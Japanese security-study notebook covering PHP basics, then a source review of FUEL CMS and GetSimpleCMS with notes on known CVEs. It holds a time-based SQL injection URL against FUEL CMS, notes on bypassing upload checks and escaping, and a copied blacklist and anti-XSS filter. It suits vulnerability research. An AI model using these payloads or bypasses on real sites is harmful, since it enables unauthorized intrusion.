<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [配列](#%E9%85%8D%E5%88%97)
  - [配列](#%E9%85%8D%E5%88%97-1)
  - [連想配列](#%E9%80%A3%E6%83%B3%E9%85%8D%E5%88%97)
  - [foreach](#foreach)
- [オブジェクト指向](#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E6%8C%87%E5%90%91)
  - [class](#class)
    - [基本](#%E5%9F%BA%E6%9C%AC)
    - [継承(extends) Override](#%E7%B6%99%E6%89%BFextends-override)
    - [アロー演算子(->)](#%E3%82%A2%E3%83%AD%E3%83%BC%E6%BC%94%E7%AE%97%E5%AD%90-)
    - [スコープ定義(::)と$this](#%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%97%E5%AE%9A%E7%BE%A9%E3%81%A8this)
    - [参照代入 =&](#%E5%8F%82%E7%85%A7%E4%BB%A3%E5%85%A5-)
    - [@ エラー制御演算子](#-%E3%82%A8%E3%83%A9%E3%83%BC%E5%88%B6%E5%BE%A1%E6%BC%94%E7%AE%97%E5%AD%90)
- [基本的な実装](#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E5%AE%9F%E8%A3%85)
  - [よく見る関数](#%E3%82%88%E3%81%8F%E8%A6%8B%E3%82%8B%E9%96%A2%E6%95%B0)
  - [session](#session)
  - [login](#login)
  - [file upload](#file-upload)
  - [HTMLフィルタリング](#html%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E3%83%AA%E3%83%B3%E3%82%B0)
  - [Directry Traversal対策](#directry-traversal%E5%AF%BE%E7%AD%96)
  - [urlフィルタリング](#url%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E3%83%AA%E3%83%B3%E3%82%B0)
  - [XML](#xml)
- [fuelCMS](#fuelcms)
  - [install手順](#install%E6%89%8B%E9%A0%86)
  - [基本構成](#%E5%9F%BA%E6%9C%AC%E6%A7%8B%E6%88%90)
  - [login](#login-1)
  - [password reset](#password-reset)
  - [session](#session-1)
  - [file upload](#file-upload-1)
  - [MVC](#mvc)
  - [routing](#routing)
  - [sanitizing](#sanitizing)
  - [API](#api)
  - [CVEs](#cves)
    - [CVE-2020-17463](#cve-2020-17463)
    - [CVE-2019-15228](#cve-2019-15228)
    - [CVE-2018-20137](#cve-2018-20137)
    - [CVE-2018-16763](#cve-2018-16763)
- [GetSimpleCMS](#getsimplecms)
  - [filtering](#filtering)
  - [見つけたXSS](#%E8%A6%8B%E3%81%A4%E3%81%91%E3%81%9Fxss)
  - [Directory Traversal](#directory-traversal)
  - [XSSできない例](#xss%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E4%BE%8B)
  - [file upload](#file-upload-2)
  - [XXE](#xxe)
  - [login bypass](#login-bypass)
  - [password reset](#password-reset-1)
- [デバッグ環境](#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E7%92%B0%E5%A2%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# 配列
## 配列
```php
  <?php
   $colors = array("赤","青","黄");
    echo $colors[0];
    $colors[] = "白";
    echo $colors[3];
  ?>
```
## 連想配列
```php
 <?php
    $scores = array("数学" => 70,
                    "英語" => 90,
                    "国語" => 80);
    $scores["国語"] += 5;
    echo $scores["国語"];
  ?>
```
## foreach
```php
  <?php
    $scores = array('数学' => 70, '英語' => 90, '国語' => 80);
    foreach($scores as $key=>$value){
      echo $key."は".$value."点です。";
    }    
  ?>
```
# オブジェクト指向
## class
### 基本
```php
<?php
// インスタンスを作成
$parent1 = new ParentClass("John");  // $name: John
// アロー演算子でメソッドを呼び出す
$parent1->hello();  // parent class hello!

class ParentClass{
    // protectedはそのクラス自身と継承クラスからアクセス可能
    protected $name;
    // コンストラクタを定義
    function __construct($name){
        $this->name = $name;
        echo "\$name: ".$this->name."\n";
    }
    // メソッドを定義
    public function hello(){
        echo "parent class hello!";
    }
}

?>
```
### 継承(extends) Override
```php
<?php
$child1 = new ChildClass("John",20);
$child1->hello();

// 出力結果
// name: John
// $age: 20
// child class hello! John

class ParentClass{
    protected $name;
    function __construct($name){
        $this->name = $name;
        echo "\$name: ".$this->name."\n";
    }
    public function hello(){
        echo "parent class hello!";
    }
}

// ParentClassを継承する
class ChildClass extends ParentClass{
    protected $age;
    function __construct($name,$age){
        // parent::で親クラスのコンストラクタを呼び出す
        parent::__construct($name);
        $this->age = $age;
        echo "\$age: ".$this->age."\n";
    }
    // 親クラスのhello()をオーバーライドする
    public function hello(){
        // parent::で親クラスのコンストラクタを呼び出したので$this->nameに値がセットされている
        echo "child class hello! ".$this->name;
    } 
}
?>
```
### アロー演算子(->)
アロー演算子`->`はクラスのメソッドやプロパティにアクセスするための演算子。  
`user->get_user()`とかの場合は`user`インスタンスの`public function get_user`メソッドを実行する。左側の`user`はインスタンス名であってクラス名ではない。  
https://qiita.com/sho91/items/c6503e7d344ca29aa03f  
### スコープ定義(::)と$this
scope定義演算子`::`を使うのはクラスの定数や静的なメソッドにアクセスする場合。  
`users::get_user()`とかの場合は、`users`クラスに`public static function get_user(`が定義されていてそれを呼び出している。  
こういう`users`クラスは`application/models/users.php`とかによく定義されてる。  
```php
<?php
// Your code here!
$child1 = new ChildClass("John",20);
// infoメソッドを実行
$child1->info();

// 出力結果
// $name: John
// $age: 20
// human
// man
// child class hello! John
// child class hello! John
// parent class hello!
// こんにちは！
// こんにちは！

// 変更なし
class ParentClass{
    protected $name;
    function __construct($name){
        $this->name = $name;
        echo "\$name: ".$this->name."\n";
    }
    public function hello(){
        echo "parent class hello!\n";
    }
}

class ChildClass extends ParentClass{
    protected $age;
    // 定数ANIMALを追加
    const ANIMAL = "human";
    // staticな変数(インスタンスなしでもアクセス可能)を追加
    public static $sex = "man";
    
    function __construct($name,$age){
        parent::__construct($name);
        $this->age = $age;
        echo "\$age: ".$this->age."\n";
    }
    public function hello(){
        echo "child class hello! ".$this->name."\n";
    }
    // staticメソッドを追加
    public static function greet(){
        echo "こんにちは！\n";
    }
    // いろいろechoさせる
    public function info(){
        echo self::ANIMAL."\n";  // ANIMALは定数なのでself::じゃないとだめ
        // echo $this->ANIMAL;   // $this->だとerror
        echo self::$sex."\n";    // $sexはstaticなのでself::じゃないとだめ
        // echo $this->sex;      // $this->だとerror
        
        // $thisは自分自身のオブジェクトを指し、インスタンス化した際、クラス内のメンバ変数やメソッドにアクセスする際に使用
        $this->hello();     // child class hello! John
        // self::は自クラスを示す。定数やstaticに使うため子の使い方は良くない(でも実行できてしまう仕様)
        self::hello();      // child class hello! John
        // parent::は親クラスを示す。定数とかじゃなくても使える
        parent::hello();    // parent class hello!
        
        // こっちではgreet()はstaticなため、self::で呼び出すのがよさそう(でも両方実行できる)
        $this->greet();
        self::greet();
    }
}
?>
```
### 参照代入 =&

### @ エラー制御演算子
`@mkdir`とかでエラーが発生してもそれを出力しないようにする。  
https://php1st.com/2665  
# 基本的な実装
## よく見る関数
- `pathinfo`  
ファイル名から拡張子を取り出すときによく使う。  
例: `pathinfo('/fruits/melon/eat/index.php');`  
中身は以下の通り。  
```txt
array(4) {
  ["dirname"]=>
  string(17) "/fruits/melon/eat"
  ["basename"]=>
  string(9) "index.php"
  ["extension"]=>
  string(3) "php"
  ["filename"]=>
  string(5) "index"
}
```
https://www.sejuku.net/blog/50670  
- `trim`  
文字列の先頭および末尾にあるホワイトスペースを取り除く  
実質ほぼ何もしないのでこれでSanitizeしたことにしてる場合は脆弱  
例: `echo(trim(" aa bb cc ")); // "aa bb cc"`  
https://www.php.net/manual/ja/function.trim.php  
- `explode`  
文字列を文字列により分割する。空白で配列に分割することが多そう。  
例: `var_dump(explode(" "," aa bb cc "));`  
```txt
array(5) {
  [0]=>
  string(0) ""
  [1]=>
  string(2) "aa"
  [2]=>
  string(2) "bb"
  [3]=>
  string(2) "cc"
  [4]=>
  string(0) ""
}
```
https://www.php.net/manual/ja/function.explode.php  
- `mysqli_connect`  
DBに接続する。  
例: `mysqli_connect("localhost", "my_user", "my_password", "world");`  
- `mysqli_query`  
SQL文を実行する。  
例: `mysqli_query($link, "CREATE TEMPORARY TABLE myCity LIKE City");`  
- `mysqli_real_escape_string`  
`mysqli::real_escape_string`,`mysqli::escape_string`と同じ。  
SQLのクエリを`'`なら`\'`とかにエスケープしてSQL Injectionを防ぐ。これがあるとSQL Injectionは無理。  
`\x00`,`\n`,`\r`,`\`,`'`,`"`,`ctr-z`をエスケープする。  
例: `mysqli_real_escape_string(mysqli_connect("localhost", "my_user", "my_password", "world"), "AAAAAA'");`  
https://www.php.net/manual/ja/mysqli.real-escape-string.php  
- `real_escape_string`  
上と同じ。  
例: `$city = $mysqli->real_escape_string("AAAA'");`  
- `mysql_real_escape_string`  
PHP 5.5.0 で非推奨になり、PHP 7.0.0 で削除された。  
`where id=%s`みたいな場合、`1 or 1=1`みたいな`'`を使わないSQL Injectionなら可能となってしまう！  
例: `mysql_real_escape_string($user);`  
https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string  
- `mysql_escape_string`  
`%`,`_`は通すらしい。  
- `addslashes`  
`'`,`"`,`\`,`\x00`の前にバックスラッシュを付けてくれる。  
文字コードによっては危険。  
`\x95'`を`\x95\x5c'`とエスケープするがこれはShift-JISでは「表」という文字を指す。  
`%bf%22`を`%bf%5c%22`とエスケープするがこれはbig5tblではなんかの漢字として扱われる。   
https://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string  
 
## session
## login
入力がハッシュ化されたりされなかったり。  
以下ではType JugglingできるのでMagic Hashならバイパス可能。ただ、事前に定義済みのsaltを使ってハッシュ化する場合は無理。  
```php
			if ( ($userid == $USR) && ($password == $PASSWD) ) {
				$authenticated = true;
			} else {
				$authenticated = false;
```
## file upload
拡張子とMIME Typeをブラックリスト、ホワイトリストで制限。  
ブラックリストなら回避は容易だけど、ファイルの中身を見て`mime_content_type()`,`finfo_file`とかでMIME Typeを判断する場合はBurp SuiteでContents-Typeを偽装しても無意味。`$_FILE`から得られるMIME Typeで判断してるかどうか注意。  
ただ、拡張子を`evil.phar`としてファイルの先頭に`GIF89a;`を付けとけば`mime_content_type()`はバイパスできて`image/gif`だと思ってくれる。  
## HTMLフィルタリング
ここら辺みたいに入力されたものをユーザーが定義したフィルタリングの関数に通す。  
大体がHTMLエンティティ化したりHTMLタグを取ったりバックスラッシュを記号前に付与したり？  
ただし、HTMLエンティティ化はデコードした後にechoしてる場合もあるので、一度エンティティ化していてもXSSの可能性あり。  
```php
$id    = isset($_GET['id'])    ? var_out( $_GET['id']    ): null;
$title = var_out(xss_clean($_POST['post-title']));
$metak = safe_slash_html(strip_tags($_POST['post-metak']));
```
## Directry Traversal対策
`str_replace()`による一回だけの`../`の置き換えはほぼ無意味。  
でも、`path_is_safe()`とかで指定されたディレクトリを抜けてるかどうかのチェックがあればTraversalは無理そう…  
```php
if (isset($_GET['path']) && !empty($_GET['path'])) {
	$path = str_replace('../','', $_GET['path']);	
	if(!path_is_safe($path,GSDATAUPLOADPATH)) die();
```
## urlフィルタリング
`phar://`が可能かどうかチェック。  
## XML
実体参照が許可されていない場合はXXEは無理。  
```php
	libxml_disable_entity_loader();
	$in = simplexml_load_string($_POST['data'], 'SimpleXMLExtended', LIBXML_NOCDATA);
```
ユーザーからのいろんな入力をXMLオブジェクトとして管理したり(GetSimpleCMS)。  

# fuelCMS
## install手順
https://www.youtube.com/watch?v=TLpgSnqqWlo  
を参考にKaliに入れた。  
php-curlがphp7.3に入らなかったりしたのでphp7.4に変えて、apache2でphp7.4をロードするように`a2enmod php7.4`したり、いろいろした。KaliのレポジトリのApt Keyが古かったので更新したりめちゃくちゃ手間取ってしまった…  
まあはじめはこんなもんか…  
他のトラブルシューティング  
https://forum.getfuelcms.com/discussion/3022/object-not-found-fuel-start  
## 基本構成
`fuel/install/fuel_shema.sql`でDBの初期設定を行う。これを`mysql fuel > fuel_schema.sql`でfuelという事前に手動で作成したおいたDBにテーブルとかを作成するっぽい。  
`fuel/application/config/database.php`にMariaDBへの接続用のパスワードとかを設定する。  
`fuel/application/config/MY_fuel.php`に`$config['admin_enabled'] = TRUE;`とかでadminモードを実行するかどうかとかの設定を行うっポイ。  
## login
`fuel\modules\fuel\controllers\Login.php`にログイン処理があるっぽい。  
`if ($this->fuel->auth->login($this->input->post('user_name', TRUE), $this->input->post('password', TRUE)))`でログイン成功かどうか判断してるっぽい。  
```php
				if ($this->input->post('user_name') AND $this->input->post('password'))
				{
					if ($this->fuel->auth->login($this->input->post('user_name', TRUE), $this->input->post('password', TRUE)))
					{
						// reset failed login attempts
						$user_data['failed_login_timer'] = 0;
						// set the cookie for viewing the live site with added FUEL capabilities
						$config = array(
							'name' => $this->fuel->auth->get_fuel_trigger_cookie_name(), 
							'value' => serialize(array('id' => $this->fuel->auth->user_data('id'), 'language' => $this->fuel->auth->user_data('language'))),
							'expire' => 0,
							//'path' => WEB_PATH
							'path' => $this->fuel->config('fuel_cookie_path')
						);

						set_cookie($config);

						$forward = $this->input->post('forward');
						$forward_uri = uri_safe_decode($forward);

```

```php
	public function login($user, $pwd)
	{
		$this->CI->load->module_model(FUEL_FOLDER, 'fuel_users_model');
		$valid_user = $this->CI->fuel_users_model->valid_user($user, $pwd);

		// check old password logins
		if (empty($valid_user))
		{
			$valid_user = $this->CI->fuel_users_model->valid_old_user($user, $pwd);
		}
		
		if (!empty($valid_user)) 
		{
			// update the hashed password & add a salt
			$salt = $this->CI->fuel_users_model->salt();
			$updated_user_profile = array('password' => $this->CI->fuel_users_model->salted_password_hash($pwd, $salt), 'salt' => $salt);
			$updated_where = array('user_name' => $user, 'active' => 'yes');


			// update salt on login
			if ($this->CI->fuel_users_model->update($updated_user_profile, $updated_where))
			{
				$this->set_valid_user($valid_user);
				$this->CI->fuel->logs->write(lang('auth_log_login_success', $valid_user['user_name'], $this->CI->input->ip_address()), 'debug');
				return TRUE;
			}
			else
			{
				$this->CI->fuel->logs->write(lang('auth_log_failed_updating_login_info', $valid_user['user_name'], $this->CI->input->ip_address()), 'debug');
				return FALSE;
			}
		}

		return FALSE;	
	}
```
```txt
root@kali:/var/www/fuel# cat ./fuel/modules/fuel/models/Fuel_users_model.php | grep "public function"
	public function __construct()
	public function valid_user($user, $pwd)
	public function valid_old_user($user, $pwd)
	public function list_items($limit = NULL, $offset = NULL, $col = 'email', $order = 'desc', $just_count = FALSE)
	 public function user_info($user_id)
	public function get_reset_password_token($email)
	public function validate_reset_token($token)
	public function reset_password_from_token($email, $token, $password)
	public function generate_token()
	public function user_exists($email)
	public function salt()
	public function salted_password_hash($password, $salt)
	public function options_list($key = 'id', $val = 'name', $where = array(), $order = 'name')
	public function related_items($values = array())
	public function form_fields($values = array(), $related = array())
	public function _create_permission_fields($params = array())
	public function on_before_clean($values)
	public function on_before_validate($values)
	public function check_password_strength($value)
	public function on_before_save($values)
	public function on_after_save($values)
	public function delete($where)
	public function is_new_email($email)
	public function is_editable_email($email, $id)
	public function _common_query($params = NULL)

```
## password reset
`pwd_reset`が`fuel/modules/fuel/controllers/Login.php`にある。  
`Reset.php`のそれっぽい。  
## session
`fuel/modules/fuel/helpers/session_helper.php`に`function session_set_userdata`とかがあるっぽい。  
`fuel/modules/fuel/libraries/Fuel_auth.php`でログインしてるかどうかとかの処理があるっぽい。  
```txt
root@kali:/var/www/fuel# cat ./fuel/modules/fuel/libraries/Fuel_auth.php | grep "public function"
	public function __construct($params = array())
	public function login($user, $pwd)
	public function set_valid_user($valid_user)
	public function valid_user()
	public function set_user_data($key, $value)
	public function user_data($key = NULL)
	public function get_session_namespace()
	public function get_fuel_trigger_cookie_name()
	public function can_access()
	public function check_valid_ip($ips)
	public function is_logged_in()
	public function has_permission($permission, $type = '')
	public function accessible_module($module)
	public function get_permissions()
	public function is_super_admin()
	public function module_has_action($action)
	public function is_fuelified()
	public function user_lang()
	public function logout()

```
## file upload
`fuel/modules/fuel/controllers/Pages.php`に`function upload()`があってサニタイジングとかしてる？  
```php
	public function upload()
	{

// snip

		$this->js_controller_params['method'] = 'upload';

		if ( ! empty($_POST) AND !empty($_FILES))
		{
			$params['upload_path'] = sys_get_temp_dir();
			$params['allowed_types'] = 'php|html|txt';

			// to ensure we check the proper mime types
			$this->upload->initialize($params);

			// Hackery to ensure that a proper php mimetype is set. 
			// Would set in mimes.php config but that may be updated with the next version of CI which does not include the text/plain
			/*$this->upload->mimes['php'] =  array(
				'application/x-httpd-php', 
				'application/php', 
				'application/x-php', 
				'text/php',
				'text/html', 
				'text/x-php', 
				'application/x-httpd-php-source', 
				'text/plain'
			);*/

			if ($this->upload->do_upload('file'))
			{
				$upload_data = $this->upload->data();
				$error = FALSE;

				// sanitize the file before saving
				$id = $this->input->post('id', TRUE);
				$pagevars = $this->fuel->pages->import($id);

				if ( ! empty($pagevars))
				{
					$layout = $this->fuel->layouts->get($pagevars['layout']);
					unset($pagevars['layout']);

					foreach($pagevars as $key => $val)
					{
						$where['page_id'] = $id;
						$where['name'] = $key;

						$page_var = $this->fuel_pagevariables_model->find_one_array($where);

						$save['id'] = (empty($page_var['id'])) ? NULL : $page_var['id'];
						$save['name'] = $key;
						$save['page_id'] = $id;
						$save['value'] = $val;

						if ( ! $this->fuel_pagevariables_model->save($save))
						{
							add_error(lang('error_upload'));
						}
					}
// snip
		}
// snip
```
codeigniterで事前に用意されている`CI_Loader`,`CI_Upload`クラスとかを使ってファイルを処理してる。  
詳しくはここ参照。  
http://www.ci-guide.info/practical/library/upload/  
  
これでPOSTリクエストを発生させてるっぽい。`add_session`の中で`curl`を呼び出してる。(sanitizingしてるところの`$id = $this->input->post('id', TRUE);`はこの関数とは多分無関係)  
```php
	public function post($url, $post = array())
	{
		// NOTE TO SELF: to add a file to upload, you can do the following as a value:
		//'@path/to/file.txt;type=text/html';
		$opts = $this->_opts('post', $post);
		$this->add_session($url, $opts);
		return $this->exec_single();
	}
```
`$id = $this->input->post('id', TRUE);`では、`CI_Input`クラスのメソッドを使って、`id=1234`とかでPOSTされてきたデータを`$id`に代入するっぽい。  
https://codeigniter.jp/user_guide/3/libraries/input.html  
  
`$pagevars = $this->fuel->pages->import($id);`では、`fuel/modules/fuel/libraries/Fuel_pages.php`で定義されてる`public function import($page, $sanitize = TRUE)`でPOSTされた`id=1234`の`1234`というコンテンツを検索して見つかればそのファイルの中身を読み込んで値を返してるっぽい？？  
```php
	public function import($page, $sanitize = TRUE)
	{
		$this->CI->load->helper('file');

		if (!isset($this->CI->fuel_pages_model))
		{
			$this->CI->load->module_model(FUEL_FOLDER, 'fuel_pages_model');
		}
		$model =& $this->CI->fuel_pages_model;

		if (!is_numeric($page))
		{
			$page_data = $model->find_by_location($page, FALSE);
		}
		else
		{
			$page_data = $model->find_by_key($page, 'array');
		}
		
		$view_twin = APPPATH.'views/'.$page_data['location'].EXT;

		$pagevars = array();
		if (file_exists($view_twin))
		{

			// must have content in order to not return error
			$output = file_get_contents($view_twin);
      
      // snip
```
## MVC
`fuel/moduels/fuel/core/MY_Model.php`で`public function find_one($where = array(), $order_by = NULL, $return_method = NULL)`とかで多分データベースに実際にアクセスしてるっぽい？？  
`fuel/modules/fuel/models/`以下にDB関係の処理があるっぽい？？  
## routing

## sanitizing
`fuel/modules/fuel/controllers/Module.php`にサニタイジングが書かれてる。  
でもその処理自体は書かれてなくて、`$posted[$key] = $func($posted[$key]);`で中身を実際にサニタイジングしてるっぽい。  
`$func`には`$valid_funcs = $this->fuel->config('module_sanitize_funcs');`が入っている。  
```php
	/**
	 * Sanitizes the input based on the module's settings
	 *
	 * @access	protected
	 * @param	array	The array of posted data to sanitize
	 * @return	array
	 */	
	protected function _sanitize($data)
	{
		$posted = $data;

		if ( ! empty($this->sanitize_input))
		{
			// functions that are valid for sanitizing
			$valid_funcs = $this->fuel->config('module_sanitize_funcs');

			if ($this->sanitize_input === TRUE)
			{
				$this->sanitize_input = array('xss');
			}

			// force to array to normalize
			$sanitize_input = (array) $this->sanitize_input;

			if (is_array($data))
			{
				foreach($data as $key => $post)
				{
					if (is_array($post))
					{
						$posted[$key] = $this->_sanitize($post);
					}
					else
					{
						// loop through sanitization functions 
						foreach($sanitize_input as $func)
						{
							$func = (isset($valid_funcs[$func])) ? $valid_funcs[$func] : FALSE;

							if ($func)
							{
								$posted[$key] = $func($posted[$key]);
							}
						}
					}
				}
			}
			else
			{
				// loop through sanitization functions 
				foreach($sanitize_input as $key => $val)
				{
					$func = (isset($valid_funcs[$val])) ? $valid_funcs[$val] : FALSE;

					if ($func)
					{
						$posted = $func($posted);
					}
				}
			}
		}

		return $posted;
	}
```
`$this->fuel->config('module_sanitize_funcs');`は`fuel/modules/fuel/config/fuel.php`で定義されてるっぽい。`xss_clean`とかはcodeigniterで定義されてる安全なフィルタっぽい？？  
```php
$config['module_sanitize_funcs'] = array(
	'xss' => 'xss_clean', 
	'php' => 'encode_php_tags', 
	'template' => 'php_to_template_syntax', 
	'entities' => 'htmlentities'
);
```
## API
なさげ？  
## CVEs
https://www.cvedetails.com/vulnerability-list/vendor_id-19221/product_id-49911/Thedaylightstudio-Fuel-Cms.html  
### CVE-2020-17463
https://www.exploit-db.com/exploits/48741  
```txt
/fuelcms/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(5)))ULQV)&fuel_inline=0
```
で`col`の値(カラム名を指定するっぽい)にTime basedSQL Injectionがあるらしい。1.4.7で発見されてるけど1.4.13で試すと確かに成功してる！！？？よな？？  
`fuel/modules/fuel/models/Base_module_model.php`で定義されてる`public function list_items($limit = NULL, $offset = 0, $col = 'id', $order = 'asc', $just_count = FALSE)`でDBとやり取りするあたりが怪しいっぽい？？  
多分SQLMapで発見してるっぽいから手動ではかなりきつそう？？？  
生のSQL文を生成してる箇所はなくて、codeigniterの`$this->db->select()`みたいにしてSQL文を操作してるっぽい。  

### CVE-2019-15228
![image](https://user-images.githubusercontent.com/56021519/106925451-73f03280-6753-11eb-96c1-0aad99ecd21d.png)  
ここにXSSがあるらしいけど今はうまく行ってない…  
発見されたバージョンは1.4.4だから1.4.13では動かないっぽい？  
https://www.cvedetails.com/cve/CVE-2019-15228/  
https://github.com/daylightstudio/FUEL-CMS/commit/10b7583a2b7176ec5553c8ddab3c870dd485efc0  
https://www.sevenlayers.com/index.php/237-fuelcms-1-4-4-xss  
以前はサニタイジングがなかったってことか？？？  
`fuel/modules/fuel/libraries/Data_table.php`でサニタイジングがなかったのが原因らしい。  
```php
$this->name = xss_clean($name);
```
### CVE-2018-20137
https://www.cvedetails.com/cve/CVE-2018-20137/  
https://github.com/CCCCCrash/POCs/tree/master/Web/fuel-cms/xss1  
似たようなXSSがPagesのところにあったらしい。  
https://github.com/daylightstudio/FUEL-CMS/issues/552  
別のフィールドで格納型がまだ残ってたらしい？？  

### CVE-2018-16763
https://www.cvedetails.com/cve/CVE-2018-16763/  
https://github.com/daylightstudio/FUEL-CMS/issues/478  
SQL Injectionがあるらしいけど正直見つけ方が全然わからん…  
CodeigniterでDB関係やってるからマジでよくわからん…  

# GetSimpleCMS
## filtering
`admin/inc/security_functions.php`  
```php
/**
 * Security
 *
 * @package GetSimple
 * @subpackage init
 */
/*
 * File and File MIME-TYPE Blacklist arrays
 */
$mime_type_blacklist = array(
	# HTML may contain cookie-stealing JavaScript and web bugs
	'text/html', 'text/javascript', 'text/x-javascript',  'application/x-shellscript',
	# PHP scripts may execute arbitrary code on the server
	'application/x-php', 'text/x-php',
	# Other types that may be interpreted by some servers
	'text/x-python', 'text/x-perl', 'text/x-bash', 'text/x-sh', 'text/x-csh',
	# Client-side hazards on Internet Explorer
	'text/scriptlet', 'application/x-msdownload',
	# Windows metafile, client-side vulnerability on some systems
	'application/x-msmetafile',
	# MS Office OpenXML and other Open Package Conventions files are zip files
	# and thus blacklisted just as other zip files
	'application/x-opc+zip'
);
$file_ext_blacklist = array(
	# HTML may contain cookie-stealing JavaScript and web bugs
	'html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
	# PHP scripts may execute arbitrary code on the server
	'php', 'pht', 'phtm', 'phtml', 'php3', 'php4', 'php5', 'ph3', 'ph4', 'ph5', 'phps',
	# Other types that may be interpreted by some servers
	'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh', 'ksh', 'bsh', 'c', 'htaccess', 'htpasswd',
	# May contain harmful executables for Windows victims
	'exe', 'scr', 'dll', 'msi', 'vbs', 'bat', 'com', 'pif', 'cmd', 'vxd', 'cpl' 
);

/**
 * Anti-XSS
 *
 * Attempts to clean variables from XSS attacks
 * @since 2.03
 *
 * @author Martijn van der Ven
 *
 * @param string $str The string to be stripped of XSS attempts
 * @return string
 */
function antixss($str){
	$strdirty = $str;
	// attributes blacklist:
	$attr = array('style','on[a-z]+');
	// elements blacklist:
	$elem = array('script','iframe','embed','object');
	// extermination:
	$str = preg_replace('#<!--.*?-->?#', '', $str);
	$str = preg_replace('#<!--#', '', $str);
	$str = preg_replace('#(<[a-z]+(\s+[a-z][a-z\-]+\s*=\s*(\'[^\']*\'|"[^"]*"|[^\'">][^\s>]*))*)\s+href\s*=\s*(\'javascript:[^\']*\'|"javascript:[^"]*"|javascript:[^\s>]*)((\s+[a-z][a-z\-]*\s*=\s*(\'[^\']*\'|"[^"]*"|[^\'">][^\s>]*))*\s*>)#is', '$1$5', $str);
	foreach($attr as $a) {
	    $regex = '(<[a-z]+(\s+[a-z][a-z\-]+\s*=\s*(\'[^\']*\'|"[^"]*"|[^\'">][^\s>]*))*)\s+'.$a.'\s*=\s*(\'[^\']*\'|"[^"]*"|[^\'">][^\s>]*)((\s+[a-z][a-z\-]*\s*=\s*(\'[^\']*\'|"[^"]*"|[^\'">][^\s>]*))*\s*>)';
	    $str = preg_replace('#'.$regex.'#is', '$1$5', $str);
	}
	foreach($elem as $e) {
		$regex = '<'.$e.'(\s+[a-z][a-z\-]*\s*=\s*(\'[^\']*\'|"[^"]*"|[^\'">][^\s>]*))*\s*>.*?<\/'.$e.'\s*>';
	    $str = preg_replace('#'.$regex.'#is', '', $str);
	}
	// if($strdirty !== $str) debugLog("string cleaned: removed ". (strlen($strdirty) - strlen($str)) .' chars');
	return $str;
}
function xss_clean($data){
	$datadirty = $data;
	// Fix &entity\n;
	$data = str_replace(array('&amp;','&lt;','&gt;'), array('&amp;amp;','&amp;lt;','&amp;gt;'), $data);
	$data = preg_replace('/(&#*\w+)[\x00-\x20]+;/u', '$1;', $data);
	$data = preg_replace('/(&#x*[0-9A-F]+);*/iu', '$1;', $data);
	$data = html_entity_decode($data, ENT_COMPAT, 'UTF-8');

	// Remove any attribute starting with "on" or xmlns
	$data = preg_replace('#(<[^>]+?[\x00-\x20"\'/])(?:on|xmlns)[^>]*+>#iu', '$1>', $data);
	
	// Remove javascript: and vbscript: protocols
	$data = preg_replace('#([a-z]*)[\x00-\x20]*=[\x00-\x20]*([`\'"]*)[\x00-\x20]*j[\x00-\x20]*a[\x00-\x20]*v[\x00-\x20]*a[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2nojavascript...', $data);
	$data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*v[\x00-\x20]*b[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2novbscript...', $data);
	$data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*-moz-binding[\x00-\x20]*:#u', '$1=$2nomozbinding...', $data);
	
	// Only works in IE: <span style="width: expression(alert('Ping!'));"></span>
	$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?expression[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
	$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?behaviour[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
	$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:*[^>]*+>#iu', '$1>', $data);
	
	// Remove namespaced elements (we do not need them)
	$data = preg_replace('#</*\w+:\w[^>]*+>#i', '', $data);
	
	do
	{
		// Remove really unwanted tags
		$old_data = $data;
		$data = preg_replace('#</*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^>]*+>#i', '', $data);
	}
	while ($old_data !== $data);

	// we are done...
	// if($datadirty !== $data) debugLog("string cleaned: removed ". (strlen($datadirty) - strlen($data)) .' chars');
	return $data;
}
```
## 見つけたXSS
3.3.16で探してたらなんか見つけた。  
`admin/changedata.php`  
`$title`だけかかっているフィルタリング違うことがわかる。  
`safe_slash_html(strip_tags())`がなくて`xss_clean()`と`var_out()`に入ってることがわかる。  `sage_slash_html()`はHTMLエンティティ化して記号に`addslashes`でバックスラッシュを付ける、`var_out()`はなんかフィルターでサニタイジングした後にHTMLエンティティ化してる。  
この二つは`admin/inc/security_functions.php`で定義されてるフィルタリングの関数で正常に動いていそうだけど…なんでXSS行けるんだ？？？  
そのあとはフィルタリングした各データを`$note->addCData($title);`でXML形式のオブジェクトとして保存してるっぽい。  
